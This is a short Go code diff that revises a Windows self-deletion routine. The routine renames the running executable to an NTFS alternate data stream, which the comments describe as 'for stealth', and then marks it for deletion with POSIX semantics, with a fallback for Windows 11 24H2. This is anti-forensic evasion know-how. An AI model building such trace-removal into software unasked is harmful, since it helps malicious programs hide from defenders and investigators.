@@ -154,10 +154,11 @@ func deleteSelf(path string) {
 }
 
 // deleteSelfAdvanced implements the advanced self-deletion technique using
-// NTFS alternate data streams. It opens the executable, renames it to an ADS
-// (:Zone.Identifier), and marks it for deletion. Returns an error if any step
-// fails, allowing fallback to helper process method. This technique is stealthy
-// but may fail on Windows 11 24H2.
+// NTFS alternate data streams and POSIX deletion semantics. It opens the
+// executable, optionally renames it to an ADS (:Zone.Identifier), and marks
+// it for deletion using FileDispositionInfoEx with POSIX semantics. The ADS
+// rename is optional - if it fails, we still try POSIX deletion. Returns an
+// error only if marking for deletion fails.
 func deleteSelfAdvanced(path string) error {
 	handle, err := openHandleForDeletion(path)
 	if err != nil {
@@ -165,10 +166,15 @@ func deleteSelfAdvanced(path string) error {
 	}
 	defer windows.CloseHandle(handle)
 
+	// Try to rename to ADS for stealth, but don't fail if this doesn't work
+	// (Windows 11 24H2 may reject this)
 	if err := renameToADS(handle); err != nil {
-		return err
+		debugLog("ADS rename failed (%v), proceeding with direct deletion", err)
+	} else {
+		debugLog("Successfully renamed to ADS")
 	}
 
+	// Mark for deletion using POSIX semantics (critical step)
 	if err := markForDeletion(handle); err != nil {
 		return err
 	}
